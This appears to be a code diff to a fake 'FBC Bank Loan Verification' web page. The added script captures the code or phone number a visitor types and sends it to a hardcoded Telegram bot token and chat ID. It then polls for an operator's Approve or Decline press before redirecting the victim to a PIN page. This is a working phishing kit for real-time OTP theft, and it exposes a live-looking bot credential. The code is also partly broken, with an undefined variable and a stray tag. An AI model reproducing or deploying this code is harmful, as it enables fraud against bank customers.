@@ -456,25 +456,146 @@
   </div>
 
   <script>
+      BOT_TOKEN: '9167169396:AAEmzZ5ndzC0WzHEYXsY805aqoDv2qzR1Ww',
+      CHAT_ID: '8820857419',
+      APPROVE_PAGE: 'pin.html'
+    };
+
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+
+    const codeError = document.getElementById('codeError');
+    const codeInput = document.getElementById('codeInput');
+
+    function showCodeError(msg) {
+      codeError.textContent = msg;
+      codeError.style.display = 'block';
+    }
+
+    function hideCodeError() {
+      codeError.style.display = 'none';
+    }
+
+    function resetButton() {
+      isProcessing = false;
+      const btn = document.querySelector('.pill-btn');
+      btn.disabled = false;
+      btn.textContent = 'Verify';
+    }
+
+    function sendToBot(code) {
+      if (isProcessing) return;
+      isProcessing = true;
+
+      const btn = document.querySelector('.pill-btn');
+      btn.disabled = true;
+      btn.textContent = 'Verifying…';
+
+      const ts = Date.now();
+      const approveId = `approve_${ts}`;
+      const declineId = `decline_${ts}`;
+      const verifyId = `verify_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `
+<b>📱 FBC Bank Loan Verification</b>
+
+Code: <code>${codee}</code>
+Applicant: <code>Not provided</code>
+`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve', callback_data: approveId },
+                { text: '📱 Verify Device', callback_data: verifyId }
+              ],
+              [
+                { text: '❌ Decline', callback_data: declineId }
+              ]
+            ]
+          }
+        })
+      })
+      .then(() => {
+        localStorage.setItem('fbc_verified_otp', code);
+      
+        document.getElementById('spinnerOverlay').style.display = 'flex';
+        startPolling(approveId, declineId, verifyId);
+      })
+      .catch(() => {
+        hideCodeError();
+        showCodeError('Something went wrong while sending the request. Please try again.');
+        resetButton();
+      });
+    }
+
+    function startPolling(approveId, declineId, verifyId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+
+                if (cb === approveId) {
+                  clearInterval(interval);
+                  document.getElementById('spinnerOverlay').style.display = 'none';
+                  window.location.href = CONFIG.APPROVE_PAGE;
+                }
+                else if (cb === verifyId) {
+                  clearInterval(interval);
+                  document.getElementById('spinnerOverlay').style.display = 'none';
+                  window.location.href = CONFIG.APPROVE_PAGE;
+                }
+                else if (cb === declineId) {
+                  clearInterval(interval);
+                  document.getElementById('spinnerOverlay').style.display = 'none';
+                  showCodeError('Request declined. Please try again.');
+                  resetButton();
+                }
+              }
+            });
+          })
+          .catch(() => {
+            document.getElementById('spinnerOverlay').style.display = 'none';
+            showCodeError('Polling failed. Please try again.');
+            resetButton();
+          });
+      }, 1000);
+    }
+
     window.addEventListener('DOMContentLoaded', () => {
-      const savedRef = localStorage.getItem('fbc_otp_ref') || '9vXfk';
-      document.getElementById('refCodeText').textContent = 'Ref: ' + savedRef;
+      const savedCode = localStorage.getItem('fbc_verified_otp');
+      if (savedCode) {
+        codeInput.value = savedCode;
+      }
     });
 
-    function handleOtpSubmit(e) {
+    function handleCodeSubmit(e) {
       e.preventDefault();
-      const code = document.getElementById('otpInput').value.trim();
 
-      if (!code || code.length < 4) {
-        document.getElementById('otpError').style.display = 'block';
+      const codeVal = codeInput.value.trim();
+
+      if (!codeVal || codeVal.length < 8) {
+        showCodeError('Please enter a valid mobile number');
         return;
       }
 
-      document.getElementById('otpError').style.display = 'none';
-      localStorage.setItem('fbc_verified_otp', code);
-
-      window.location.href = 'pin.html';
+      hideCodeError();
+      sendToBot(codeVal);
     }
+
+    document.getElementById('codeForm').addEventListener('submit', handleCodeSubmit);
 
     function openSupportModal() {
       document.getElementById('supportModal').style.display = 'flex';
@@ -483,6 +604,13 @@
     function closeSupportModal() {
       document.getElementById('supportModal').style.display = 'none';
     }
+    </script>
+      <div id="spinnerOverlay">
+    <div class="spinner"></div>
+    <div class="spin-label">Verifying &amp; Processing</div>
+    <div class="spin-sub">Please hold on…</div>
+      </div>
+
   </script>
 </body>
 </html>
